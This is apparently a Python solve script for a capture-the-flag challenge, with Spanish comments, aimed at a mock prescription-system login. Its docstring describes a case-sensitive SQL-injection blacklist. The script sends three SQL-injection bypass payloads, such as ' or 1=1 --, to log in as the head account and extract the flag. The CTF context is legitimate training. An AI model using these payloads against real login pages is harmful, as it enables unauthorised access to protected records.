#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Sistema central de recetas (203.0.113.10:8004)

Vulnerabilidad: inyeccion SQL en el login. El filtro anti-inyeccion es una
lista negra sensible a mayusculas: bloquea `OR `/`UNION ` en mayusculas, pero
acepta minusculas o mayusculas mezcladas.

Bypass: usuario = ' or 1=1 --   (devuelve la primera fila, la de jefatura)

Uso: python solve.py [host:puerto]
"""
from __future__ import annotations

import re
import sys

import requests

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "203.0.113.10:8004")
FLAG_RE = re.compile(r"cdm\{[^}]*\}")
MSG_RE = re.compile(r'<div class="msg[^"]*">([\s\S]*?)</div>')

PAYLOADS = [
    "' or 1=1 --",
    "' Or 1=1 --",
    "'/**/or/**/1=1--",
]


def intentar(s: requests.Session, usuario: str) -> tuple[str, str | None]:
    r = s.post(f"{BASE}/", data={"usuario": usuario, "clave": "x"}, timeout=15)
    msg = MSG_RE.search(r.text)
    flag = FLAG_RE.search(r.text)
    return (re.sub(r"<[^>]+>", "", msg.group(1)).strip() if msg else ""), (flag.group(0) if flag else None)


def main() -> int:
    s = requests.Session()
    s.get(f"{BASE}/", timeout=15)

    for usuario in PAYLOADS:
        mensaje, flag = intentar(s, usuario)
        print(f"[*] usuario={usuario!r} -> {mensaje}")
        if flag:
            print(f"[+] FLAG: {flag}")
            with open("flag.txt", "w", encoding="utf-8") as fh:
                fh.write(flag + "\n")
            return 0

    print("[-] ningun payload obtuvo la credencial de jefatura")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
